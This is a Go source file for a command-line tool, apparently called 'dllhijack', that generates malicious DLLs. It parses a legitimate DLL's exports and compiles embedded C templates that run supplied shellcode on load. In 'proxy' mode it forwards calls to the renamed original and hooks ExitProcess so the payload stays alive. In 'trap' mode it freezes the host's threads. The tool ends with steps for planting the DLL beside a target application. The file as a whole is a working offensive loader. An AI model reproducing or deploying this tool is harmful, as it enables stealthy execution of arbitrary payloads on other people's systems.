package main

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"text/template"
)

// Proxy模式 (转发 + ExitProcess Hook)
const cTemplateProxy = `
#include <windows.h>

unsigned char shellcode[] = { {{.ShellcodeStr}} };

typedef void (WINAPI *PEXIT_PROCESS)(UINT uExitCode);
PEXIT_PROCESS pOrigExitProcess = NULL;

// 让线程休眠，保活 Shellcode
void WINAPI MyExitProcess(UINT uExitCode) {
   Sleep(INFINITE);
}

// Hook ExitProcess
void InstallExitHook() {
   HMODULE hKernel = GetModuleHandleA("kernel32.dll");
   if (!hKernel) return;

   void* pFunc = (void*)GetProcAddress(hKernel, "ExitProcess");
   if (!pFunc) return;

#ifdef _WIN64
   // Mov Rax, Addr; Jmp Rax
   unsigned char patch[] = {
       0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
       0xFF, 0xE0
   };
   *(void**)(patch + 2) = (void*)&MyExitProcess;
#else
   // Jmp Offset
   unsigned char patch[5];
   patch[0] = 0xE9;
   DWORD offset = (DWORD)&MyExitProcess - ((DWORD)pFunc + 5);
   *(DWORD*)(patch + 1) = offset;
#endif
   DWORD oldProtect;
   if (VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
       memcpy(pFunc, patch, sizeof(patch));
       VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);
   }
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
   void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if (exec) {
       memcpy(exec, shellcode, sizeof(shellcode));
       ((void(*)())exec)();
   }
   return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
   switch (fdwReason) {
   case DLL_PROCESS_ATTACH:
       SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
       CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
       InstallExitHook();
       break;
   }
   return TRUE;
}
`

// Trap模式 (线程冻结)
const cTemplateTrap = `
#include <windows.h>
#include <tlhelp32.h>

unsigned char shellcode[] = { {{.ShellcodeStr}} };

// 查找并挂起当前进程中除自己以外的所有线程
void FreezeMainThread() {
  DWORD dwCurrentId = GetCurrentProcessId();
  DWORD dwMyThreadId = GetCurrentThreadId();
  HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  if (hThreadSnap == INVALID_HANDLE_VALUE) return;
  THREADENTRY32 te32;
  te32.dwSize = sizeof(THREADENTRY32);

  if (Thread32First(hThreadSnap, &te32)) {
      do {
          if (te32.th32OwnerProcessID == dwCurrentId) {
              if (te32.th32ThreadID != dwMyThreadId) {
                  HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                  if (hThread != NULL) {
                      SuspendThread(hThread);
                      CloseHandle(hThread);
                  }
              }
          }
      } while (Thread32Next(hThreadSnap, &te32));
  }
  CloseHandle(hThreadSnap);
}

// 黑洞函数
__declspec(dllexport) void TrapFunc() {
  Sleep(INFINITE);
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
  Sleep(50);
  FreezeMainThread();

  void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (exec) {
      memcpy(exec, shellcode, sizeof(shellcode));
      ((void(*)())exec)();
  }
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  switch (fdwReason) {
  case DLL_PROCESS_ATTACH:
      SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
      CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
      break;
  }
  return TRUE;
}
`

type Config struct {
	Mode          string
	TargetDLL     string
	OutputDLL     string
	ShellcodePath string
	OrigDllName   string
}

type ExportFunction struct {
	Name    string
	Ordinal uint32
}

type TemplateData struct {
	ShellcodeStr string
}

// 转换导出函数
func parseExports(dllPath string) ([]ExportFunction, error) {
	f, err := pe.Open(dllPath)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var exportRVA uint32
	switch opt := f.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		exportRVA = opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	case *pe.OptionalHeader32:
		exportRVA = opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	default:
		return nil, fmt.Errorf("unknown header")
	}

	if exportRVA == 0 {
		return nil, fmt.Errorf("no exports found")
	}

	var section *pe.Section
	for _, s := range f.Sections {
		if exportRVA >= s.VirtualAddress && exportRVA < s.VirtualAddress+s.VirtualSize {
			section = s
			break
		}
	}
	if section == nil {
		return nil, fmt.Errorf("export section not found")
	}

	data, err := section.Data()
	if err != nil {
		return nil, err
	}

	dirOffset := exportRVA - section.VirtualAddress
	numNames := binary.LittleEndian.Uint32(data[dirOffset+24:])
	addrNames := binary.LittleEndian.Uint32(data[dirOffset+32:])
	addrNameOrdinals := binary.LittleEndian.Uint32(data[dirOffset+36:])
	base := binary.LittleEndian.Uint32(data[dirOffset+16:])

	var exports []ExportFunction
	for i := uint32(0); i < numNames; i++ {
		namePtrOffset := (addrNames - section.VirtualAddress) + i*4
		if uint32(len(data)) < namePtrOffset+4 {
			break
		}
		nameRVA := binary.LittleEndian.Uint32(data[namePtrOffset:])
		nameOffset := nameRVA - section.VirtualAddress
		if uint32(len(data)) <= nameOffset {
			continue
		}
		end := nameOffset
		for end < uint32(len(data)) && data[end] != 0 {
			end++
		}

		ordOffset := (addrNameOrdinals - section.VirtualAddress) + i*2
		ordIndex := binary.LittleEndian.Uint16(data[ordOffset:])

		exports = append(exports, ExportFunction{
			Name:    string(data[nameOffset:end]),
			Ordinal: uint32(ordIndex) + base,
		})
	}
	return exports, nil
}

// 生成DEF文件，根据模式选择不同的策略
func generateDEFFile(cfg Config, exports []ExportFunction, defPath string) error {
	var sb strings.Builder
	sb.WriteString("EXPORTS\n")

	if cfg.Mode == "proxy" {
		origBase := strings.TrimSuffix(filepath.Base(cfg.OrigDllName), filepath.Ext(cfg.OrigDllName))
		for _, exp := range exports {
			sb.WriteString(fmt.Sprintf("\t%s=%s.%s @%d\n", exp.Name, origBase, exp.Name, exp.Ordinal))
		}
	} else {
		for _, exp := range exports {
			sb.WriteString(fmt.Sprintf("\t%s=TrapFunc @%d\n", exp.Name, exp.Ordinal))
		}
	}
	return os.WriteFile(defPath, []byte(sb.String()), 0644)
}

func generateCFile(cfg Config, cPath string) error {
	scData, err := os.ReadFile(cfg.ShellcodePath)
	if err != nil {
		return err
	}

	var hexBuilder strings.Builder
	for i, b := range scData {
		if i > 0 {
			hexBuilder.WriteString(", ")
		}
		if i%16 == 0 && i > 0 {
			hexBuilder.WriteString("\n    ")
		}
		hexBuilder.WriteString(fmt.Sprintf("0x%02x", b))
	}

	tplStr := cTemplateProxy
	if cfg.Mode == "trap" {
		tplStr = cTemplateTrap
	}

	tmpl, err := template.New("c").Parse(tplStr)
	if err != nil {
		return err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, TemplateData{ShellcodeStr: hexBuilder.String()}); err != nil {
		return err
	}
	return os.WriteFile(cPath, buf.Bytes(), 0644)
}

func compile(cfg Config, is64Bit bool) error {
	defFile := "temp_gen.def"
	cFile := "temp_gen.c"

	fmt.Printf("[*] Mode: %s | Parsing exports from %s...\n", strings.ToUpper(cfg.Mode), cfg.TargetDLL)
	exports, err := parseExports(cfg.TargetDLL)
	if err != nil {
		return err
	}

	fmt.Println("[*] Generating DEF file...")
	if err := generateDEFFile(cfg, exports, defFile); err != nil {
		return err
	}
	defer os.Remove(defFile)

	fmt.Println("[*] Generating C source...")
	if err := generateCFile(cfg, cFile); err != nil {
		return err
	}
	defer os.Remove(cFile)

	compiler := "x86_64-w64-mingw32-gcc"
	if !is64Bit {
		compiler = "i686-w64-mingw32-gcc"
	}

	if _, err := exec.LookPath(compiler); err != nil {
		return fmt.Errorf("compiler not found: %s (Please install MinGW-w64)", compiler)
	}

	fmt.Printf("[*] Compiling with %s...\n", compiler)

	// 编译参数
	args := []string{
		"-shared", "-o", cfg.OutputDLL,
		cFile, defFile,
		"-s", "-Os", "-w",
		"-Wl,--enable-stdcall-fixup",
	}

	cmd := exec.Command(compiler, args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("compile error:\n%s", out)
	}

	return nil
}

func isDLL64Bit(path string) (bool, error) {
	f, err := pe.Open(path)
	if err != nil {
		return false, err
	}
	defer f.Close()
	return f.FileHeader.Machine == pe.IMAGE_FILE_MACHINE_AMD64, nil
}

func main() {
	mode := flag.String("mode", "proxy", "Generation mode: 'proxy' (Forwarding) or 'trap' (Freeze threads)")
	target := flag.String("target", "", "Target legitimate DLL path (e.g., xxx.dll)")
	sc := flag.String("sc", "", "Shellcode binary path")
	output := flag.String("out", "", "Output DLL path")

	flag.Parse()

	if *target == "" || *sc == "" || *output == "" {
		fmt.Println("Usage: ./dllhijack -mode <proxy|trap> -target <dll> -sc <bin> -out <dll>")
		flag.PrintDefaults()
		os.Exit(1)
	}

	if *mode != "proxy" && *mode != "trap" {
		fmt.Println("[-] Invalid mode. Use 'proxy' or 'trap'.")
		os.Exit(1)
	}

	// 仅Proxy模式用于生成.def
	ext := filepath.Ext(*target)
	base := strings.TrimSuffix(filepath.Base(*target), ext)
	origName := "_" + base + ext

	cfg := Config{
		Mode:          *mode,
		TargetDLL:     *target,
		ShellcodePath: *sc,
		OutputDLL:     *output,
		OrigDllName:   origName,
	}

	is64, err := isDLL64Bit(cfg.TargetDLL)
	if err != nil {
		fmt.Printf("[-] Error checking DLL architecture: %v\n", err)
		os.Exit(1)
	}

	if err := compile(cfg, is64); err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Success! Generated: ./%s\n", cfg.OutputDLL)
	fmt.Println("---------------------------------------------------")
	fmt.Printf("[!] ACTION REQUIRED (%s Mode):\n", strings.ToUpper(cfg.Mode))

	if cfg.Mode == "proxy" {
		fmt.Printf("    1. Go to the target directory.\n")
		fmt.Printf("    2. RENAME '%s' TO '%s'\n", filepath.Base(*target), origName)
		fmt.Printf("    3. PLACE '%s' as '%s'\n", cfg.OutputDLL, filepath.Base(*target))
		fmt.Println("    [Info] App will work normally (Calls forwarded to _dllname).")
	} else {
		fmt.Printf("    1. Go to the target directory.\n")
		fmt.Printf("    2. REPLACE '%s' with '%s'\n", filepath.Base(*target), cfg.OutputDLL)
		fmt.Println("    [Info] App main functionality will FREEZE, shellcode runs.")
	}
	fmt.Println("---------------------------------------------------")
}
